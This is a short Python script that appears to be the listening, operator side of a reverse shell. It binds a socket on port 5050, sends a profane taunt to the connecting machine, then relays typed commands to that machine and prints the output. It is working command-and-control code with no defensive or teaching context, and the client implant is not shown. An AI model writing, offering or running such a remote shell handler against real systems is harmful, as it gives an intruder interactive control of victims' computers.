import socket

SERVER_HOST = "localhost"
SERVER_PORT = 5050


BUFFER_SIZE = 1024

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket , client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected")


message = "Hello firend this is your fucker".encode("utf-8")

client_socket.send(message)

while True:
    shell = ''
    
    results = client_socket.recv(BUFFER_SIZE).decode("utf-8")
    if "cwd=" in results:
        x = results.split("=")
        shell = x[1]
        command = input(f"{shell}>")
        if command.lower() == "exit":
            break
        client_socket.send(command.encode("utf-8"))
    else:
        print(results)


client_socket.close()
s.close()


